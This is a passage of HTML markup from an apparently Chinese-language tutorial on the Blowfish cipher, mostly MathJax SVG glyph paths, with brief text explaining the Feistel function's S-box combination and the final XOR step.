data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>异或的结果得到最终的加密后的64bits数据块<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.754ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 1217.2 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mi" transform="translate(861,-150) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g></g></g></g></svg></mjx-container>。</p>
</li>
</ol>
<p>Feistel函数内部流程如下图：</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220228162706.png" style="zoom:50%;">



<ol>
<li>  首先将32bits分成4个8bits，S-box的作用就是将8bits转换成为32bits。</li>
<li>  将S1盒得到的32bits与S2盒得到的32bits相加后，与S3盒得到的32bits异或后，与S4盒得到的32bits相加，得到最终32bits结果。</li>
</ol>
<p>即：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.8ex;" xmlns="http://www.w3.org/2000/svg" width="61.168ex" height="2.687ex" role="img" focusable="false" viewBox="0 -833.9 27036.3 1187.4"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path></g><g data-mml-node="mo" transform="translate(749,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(1138,0)"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mi" transform="translate(861,-150) scale(0.707)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g></g><g data-mml-node="mo" transform="translate(2530.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3197.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(4253.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(4642.1,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1167,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(1696,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(7034.6,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(8034.9,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1167,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(1596,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mspace" transform="translate(10134.5,0)"></g><g data-mml-node="mo" transform="translate(10578.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(10967.5,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mspace" transform="translate(12856.5,0)"></g><g data-mml-node="msup" transform="translate(13356.1,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(14646.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(15035.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(15646.5,0)"><path data-c="2295" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM364 542Q308 539 251 509T148 418T96 278V270H369V542H364ZM681 278Q675 338 650 386T592 462T522 509T458 535T412 542H409V270H681V278ZM96 222Q104 150 139 95T219 12T302 -29T366 -42H369V230H96V222ZM681 222V230H409V-42H412Q429 -42 456 -36T521 -10T590 37T649 113T681 222Z"></path></g><g data-mml-node="msub" transform="translate(16646.7,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1167,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mo" transform="translate(1600,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(18971.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(19971.6,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1167,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(1687,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mspace" transform="translate(22135.5,0)"></g><g data-mml-node="mo" transform="translate(22579.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(22968.5,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 